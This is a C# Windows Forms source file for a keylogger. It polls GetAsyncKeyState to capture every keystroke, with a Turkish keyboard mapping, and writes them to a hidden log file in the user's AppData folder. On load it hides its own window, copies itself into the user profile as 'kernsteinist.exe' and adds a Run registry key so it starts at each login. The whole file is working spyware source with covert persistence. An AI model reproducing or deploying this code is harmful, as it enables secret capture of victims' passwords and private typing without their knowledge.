using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Threading;
using System.Net.Mail;
using System.Net;
using System.Security.Principal;
using System.IO;
using Microsoft.Win32;



namespace logger
{



    public partial class Form1 : Form
    {

        [DllImport("User32.dll")]
        private static extern short GetAsyncKeyState(int vKey);

        string log = "";
        string path;
        DateTime first;
        FileStream fs;
        StreamWriter sw;
        Thread Thread_log;

        bool identify_it(int key,bool IsUpper,bool PressedShift,bool PressedAltgr)
        {
         
            switch (key)
            {
                
                case 9: log += "   [Tab]   "; return true;
                case 13: log += "   [enter]   "; return true;
                case 16: log += ""; return true;
              
                case 162: log += ""; return true;
                case 27: log += "  [ESC]  "; return true;
                case 112: log += "F1"; return true;
                case 113: log += "F2"; return true;
                case 114: log += "F3"; return true;
                case 115: log += "F4"; return true;
                case 116: log += "F5"; return true;
                case 117: log += "F6"; return true;
                case 118: log += "F7"; return true;
                case 119: log += "F8"; return true;
                case 120: log += "F9"; return true;
                case 121: log += "F10"; return true;
                case 122: log += "F11"; return true;
                case 123: log += "F12"; return true;
                case 44: log += "  [Print Screen]  "; return true;
                case 19: log += "  [Pause Break]  "; return true;
                case 45: log += "  [Insert]  "; return true;
                case 46: log += "  [Delete]  "; return true;
                
            
                case 192: log += PressedShift == true ? "é" : "\""; return true;
                case 8: log += "  [Delete]  "; return true;
                case 37: log += ""; return true;
                case 38: log += ""; return true;
                case 39: log += ""; return true;
                case 40: log += ""; return true;
                case 186: log += IsUpper == true ? "Ş" : "ş"; return true;
                case 222: log += IsUpper == true ? "İ" : "i"; return true;
                case 220: log += IsUpper == true ? "Ç" : "ç"; return true;
                case 191: log += IsUpper == true ? "Ö" : "ö"; return true;
                case 219: log += IsUpper == true ? "Ğ" : "ğ"; return true;
                case 221: log += IsUpper == true ? "Ü" :PressedAltgr==true?"~~":"ü"; return true;
                case 73: log += IsUpper == true ? "I" : "ı"; return true;
                case 188: log +=PressedShift==true?";":","; return true;
                case 190: log +=IsUpper==true?":":"."; return true;
                case 32: log += " "; return true;
                case 48: log += PressedShift == true ? "=" :PressedAltgr==true?"}":"0"; return true;
                case 49: log += PressedShift == true ? "!" :PressedAltgr==true?">":"1"; return true;
                case 50: log += PressedShift == true ? "'" :PressedAltgr==true?"£": "2"; return true;
                case 51: log += PressedShift == true ? "^^":PressedAltgr==true?"#":"3"; return true;
                case 52: log += PressedShift == true ? "+" :PressedAltgr==true?"$":"4"; return true;
                case 53: log += PressedShift == true ? "%" :PressedAltgr==true?"½":"5"; return true;
                case 54: log += PressedShift == true ? "&" : "6"; return true;
                case 55: log += PressedShift == true ? "/" :PressedAltgr==true?"{":"7"; return true;
                case 56: log += PressedShift == true ? "(" : PressedAltgr==true?"[":"8"; return true;
                case 57: log += PressedShift == true ? ")" : PressedAltgr==true?"]":"9"; return true;
                case 223: log += PressedShift == true ? "?" :PressedAltgr==true?@"\":"*"; return true;
                case 189: log += PressedShift == true ? "_" :PressedAltgr==true?"|":"-"; return true;
                case 110: log += PressedShift == true ? ";" :PressedAltgr==true?"``":","; return true;
                case 226: log += PressedShift == true ? ">" :PressedAltgr==true?"|":"<"; return true;
                case 69: log += IsUpper == true ? "E" : PressedAltgr == true ? "€" : "e"; return true;
                case 81: log += IsUpper == true ? "Q" : PressedAltgr == true ? "@" : "q"; return true;
                case 111: log += "/"; return true;
                case 106: log += "*"; return true;
                case 109: log += "-"; return true;
                case 107: log += "+"; return true;
                case 96: log += "0"; return true;
                case 97: log += "1"; return true;
                case 98: log += "2"; return true;
                case 99: log += "3"; return true;
                case 100: log += "4"; return true;
                case 101: log += "5"; return true;
                case 102: log += "6"; return true;
                case 103: log += "7"; return true;
                case 104: log += "8"; return true;
                case 105: log += "9"; return true;
                case 20: log += ""; return true;
            }

            return false;
        }


        
        void control()
        {
            while (true)
            { 

            bool PressedShift = false;
            bool IsUpper = false;
            bool PressedAltgr = false;

            
            for (int i = 1; i < 255; i++)
                {
                    
                 
                    if (GetAsyncKeyState(i) == Int16.MinValue+1)
                    
                    {

                        if (ModifierKeys == (Keys.Control | Keys.Alt))
                            PressedAltgr = true;

                        if (Control.IsKeyLocked(Keys.CapsLock))
                            IsUpper = true;
                        if (Control.ModifierKeys == Keys.Shift)
                        {
                           
                            IsUpper = true;
                            PressedShift = true;
                        }


                        bool x = identify_it(i, IsUpper, PressedShift, PressedAltgr);
                        
                        if (!x)
                        {

                            if (i > 64 && i < 91 || i > 96 && i < 123)
                            {
                                char c;
                                if (IsUpper == false)
                                    c = (char)(i + 32);

                                else
                                    c = (char)i;

                                log += c.ToString();
                                textBox1.Text = log;
                                sw.Write(c.ToString());
                                sw.Flush();

                            }
                       }
                   
                    }
                    
                }

            }
        }



        public  string return_driver()
        {
            string s = Environment.SystemDirectory;
            string driver_name = "";
            for (int i = 0; i < s.Length; i++)
            {
                driver_name += s[i];

                if (s[i] == '\\')
                    break;

            }

            return driver_name;
        }




        public Form1()
        {
            InitializeComponent();
        }

        /*
         blog : kernsteinist.blogspot.com.tr
         */
        private void Form1_Load(object sender, EventArgs e)
        {

            CheckForIllegalCrossThreadCalls = false;
            Thread_log = new Thread(new ThreadStart(control));
            Thread_log.Start();
            this.Hide();
            string driver_name = return_driver();
            first = DateTime.Now;

            path = return_driver() + "Users\\" + Environment.UserName + "\\AppData\\Local" + "\\log_file.txt";

            if (!(File.Exists(path)))
                fs = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
            else
            {
                fs = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);

            }

            fs = new FileStream(path, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
            sw = new StreamWriter(fs);

            if (!(File.Exists(driver_name + "Users\\" + Environment.UserName + "\\kernsteinist.exe")))
            {
                File.Copy(Application.ExecutablePath.ToString(), driver_name + "Users\\" + Environment.UserName + "\\kernsteinist.exe");
                RegistryKey add = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                add.SetValue("kernsteinist", driver_name + "Users\\" + Environment.UserName + "\\kernsteinist.exe");
            }



        }


    }
}
